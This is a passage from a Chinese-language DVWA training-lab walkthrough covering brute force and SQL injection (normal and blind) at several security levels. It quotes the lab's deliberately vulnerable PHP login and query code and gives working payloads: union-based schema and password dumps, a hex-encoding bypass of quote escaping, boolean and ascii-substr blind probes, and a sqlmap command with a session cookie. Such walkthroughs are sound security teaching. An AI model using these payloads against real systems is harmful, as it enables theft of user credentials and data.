input</span></span><br><span class="line">    $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> 	</span><br></pre></td></tr></table></figure>
-
-<p>​    可以看出，与low相比就是增加了mysqli_real_escape_string(str)函数来对sql注入做一个防护，但是对爆破没有任何防护。所以low级别的方法在这里依旧适用。</p>
-<p>重复之前的步骤，可以得到爆破结果，任然是admin与password。</p>
-<ol start="3">
-<li><strong>安全级别high</strong></li>
-</ol>
-<p>首先查看源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>可以发现，比之前多加了一个token的获取和对sql注入放入防护更加完全。</p>
-<p>但同样还是可以使用burp爆破，但需要设置好token的获取。</p>
-<p>设定好参数。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213155135852.png" alt="image-20201213155135852"></p>
-<p>将password设为参数1，为了节省时间，设置小字典。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/1838411-20200302221946296-907908890.png" alt="img"></p>
-<p>token需要从页面中获取，同时要设置为跟随重定向。options-&gt;redirection设置为always</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213155419513.png" alt="image-20201213155419513"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213155506322.png" alt="image-20201213155506322"></p>
-<p>然后将token设为参数二，开始攻击。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213155550247.png" alt="image-20201213155550247"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/1838411-20200302221728303-1028135210.png" alt="img"></p>
-<h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><ol>
-<li><strong>安全级别low</strong></li>
-</ol>
-<ul>
-<li>判断是否存在注入，注入的类型</li>
-</ul>
-<p>输入1，成功查询</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212172122987.png" alt="image-20201212172122987"></p>
-<p>输入1’ and ‘1’ = ‘2，查询失败，返回结果是空。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212172257273.png" alt="image-20201212172257273"></p>
-<p>输入 1’ and ‘1’ = ‘1 ,查询成功。说明and被执行，是一个字符型的sql注入。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212172426799.png" alt="image-20201212172426799"></p>
-<ul>
-<li>获得sql语句的字段数</li>
-</ul>
-<p>这里利用union查询需要与主查询的列数相同的特性来猜测字段数。</p>
-<p>依次用<code> 1&#39; union select 1,2,3 #</code>来猜测。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212181133795.png" alt="image-20201212181133795"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212181139975.png" alt="image-20201212181139975"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212181207701.png" alt="image-20201212181207701"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212181217925.png" alt="image-20201212181217925"></p>
-<ul>
-<li>获取当前数据库</li>
-</ul>
-<p>输入<code>1&#39; union select 1,database() #</code>，查询成功，返回数据库名。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212172736937.png" alt="image-20201212172736937"></p>
-<p>但是，并不知道返回的字段顺序，也就是说目前无法确定，数据库名是1，还是dvwa。</p>
-<ul>
-<li>确定显示字段的顺序</li>
-</ul>
-<p>输入<code>1&#39; union select 1,2 #</code>，查询成功，说明了sql语句为<code>select First name,Surname from 表 where ID=’id’...</code>。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212173104813.png" alt="image-20201212173104813"></p>
-<p>因此可以确定，数据库名为dvwa。</p>
-<ul>
-<li>获取数据库中的表</li>
-</ul>
-<p>输入<code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code></p>
-<p>查询成功，得到两个表，guestbook与users。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212173405778.png" alt="image-20201212173405778"></p>
-<ul>
-<li>获取表的字段名</li>
-</ul>
-<p>输入<code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database() #</code>，查询成功，得到八个字段名，user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212184032204.png" alt="image-20201212184032204"></p>
-<ul>
-<li>获取表的内容</li>
-</ul>
-<p>输入<code>1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</code>。`1’ or 1=1永真，结合后面的union语句，就可以得到所有用户的user_id,first_name,last_name,password这些敏感数据。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212173822932.png" alt="image-20201212173822932"></p>
-<ul>
-<li>总结</li>
-</ul>
-<p>从判断出为字符型漏洞开始，整个问题就变得简单。而且由于是low级别，没有设置任何的过滤等。只需要union其他查询语句就基本能获得想要的数据。</p>
-<ol start="2">
-<li><strong>安全级别medium</strong></li>
-</ol>
-<p>发现前端限制了输入，通过抓包来进行sql注入。</p>
-<ul>
-<li>确定注入类型</li>
-</ul>
-<p>和之前的步骤一致，先确定注入类型。</p>
-<p>输入<code>1&#39; or 1=1 #</code>，结果报错。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213143813684.png" alt="image-20201213143813684"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213143540240.png" alt="image-20201213143540240"></p>
-<p>输入<code>1 or 1=1 #</code>，查询成功，且返回了所有值。说明存在数字型注入。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213143836573.png" alt="image-20201213143836573"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213143851457.png" alt="image-20201213143851457"></p>
-<p><strong>确定注入类型之后，操作和low级别基本一致。区别在于将<code>1&#39;</code>    改为<code>1</code>.</strong></p>
-<ul>
-<li>确定查询语句字段数</li>
-</ul>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213144403881.png" alt="image-20201213144403881"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213144414545.png" alt="image-20201213144414545"></p>
-<ul>
-<li>获取当前数据库</li>
-</ul>
-<p>输入<code>1 union select 1,database() #</code></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213144556703.png" alt="image-20201213144556703"></p>
-<ul>
-<li>获取数据库中的表</li>
-</ul>
-<p>输入<code>1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213144737739.png" alt="image-20201213144737739"></p>
-<ul>
-<li>获取表的字段名</li>
-</ul>
-<p>输入<code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()# </code>查询失败。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213145021493.png" alt="image-20201213145021493"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213145047860.png" alt="image-20201213145047860"></p>
-<p>根据报错信息，可以知道是将单引号转成了\’。那么就考虑绕过方法。可以使用十六进制进行绕过。将输入改为<code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #</code>查询成功。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213145456351.png" alt="image-20201213145456351"></p>
-<ul>
-<li><p>获取表的内容</p>
-<p>输<code>1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</code></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213145605265.png" alt="image-20201213145605265"></p>
-</li>
-</ul>
-<p>最后查看一下源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    $id = mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $id);</span><br><span class="line"></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">$query  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>可以发现利用mysql_real_escape_string函数对特殊符号</p>
-<p>\x00,\n,\r,,‘,”,\x1a进行转义。</p>
-<ol start="3">
-<li><strong>安全级别high</strong></li>
-</ol>
-<p>查看源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_SESSION[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>可以发现和medium级别的差别只在，添加了LIMIT 1，限制了显示。但是可以用#注释掉，最终整个流程和low级别是一样的。</p>
-<p>因此最终结果：</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213161813828.png" alt="image-20201213161813828"></p>
-<h3 id="SQL-Injection（Blind）"><a href="#SQL-Injection（Blind）" class="headerlink" title="SQL Injection（Blind）"></a>SQL Injection（Blind）</h3><ol>
-<li><strong>安全级别low</strong></li>
-</ol>
-<p>可以看到服务器端的代码和sql注入比较，变化为不再返回查询到的内容。只返回查询的结果是否存在。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>但在实际操作中，是看不到源码的。因此首先应该确定是否存在漏洞。</p>
-<ul>
-<li>判断是否存在注入，注入的类型</li>
-</ul>
-<p>输入‘1’和<code>&#39;</code>。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213105640454.png" alt="image-20201213105640454"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213105652107.png" alt="image-20201213105652107"></p>
-<p>可以知道，返回内容是根据构造的 真假条件来的，存在sql盲注。</p>
-<p>接下来是确定注入类型，进行一系列的测试。</p>
-<table>
-<thead>
-<tr>
-<th>语句</th>
-<th>结果</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1 and 1=1 #</td>
-<td>exists</td>
-</tr>
-<tr>
-<td>1 and 1=2 #</td>
-<td>exists</td>
-</tr>
-<tr>
-<td>1’ and 1=1 #</td>
-<td>exists</td>
-</tr>
-<tr>
-<td>1’ and 1=2 #</td>
-<td>MISSING</td>
-</tr>
-</tbody></table>
-<p>倒数两个不一样，说明是字符型注入。</p>
-<p>接下来是获得当前数据库名称。</p>
-<p>那么首先需要知道数据库名称长度。</p>
-<p>利用二分法，输入类似<code>1&#39; and length(database())&gt;10 #</code>的语句，根据返回值可以确定数据库名称长度。</p>
-<p>最终得到数据库名称长度为4.</p>
-<p>然后是猜测数据库的字符组成：</p>
-<p>利用substr()函数从给定的字符串中，从指定位置开始截取指定长度的字符串，分离出数据库名称的每个位置的元素，并分别将其转换为ASCII码，与对应的ASCII码值比较大小，找到比值相同时的字符，然后各个击破。</p>
-<p>输入形如<code>1&#39; and ascii(substr(database(),1,1))&gt;88 #</code>的语句，同样利用二分法可以得到结果。</p>
-<p>之后的表名、列名、表的内容都是类似的思路。显然这需要写一个脚本来做。同样也可以借助写好的工具，sqlmap。</p>
-<ul>
-<li>利用sqlmap获得数据库名、表名、列名、表的内容。</li>
-</ul>
-<p>输入命令<code>sqlmap -u&quot;http://b48b7cef-12e4-4de4-83fd-4bd2fecbc8f0.node3.buuoj.cn/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=kl9numacbefbi9hlmnjb6e27u4; security=low&quot; --dbs</code>可以得到数据库名，dvwa。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213112004627.png" alt="image-20201213112004627"></p>
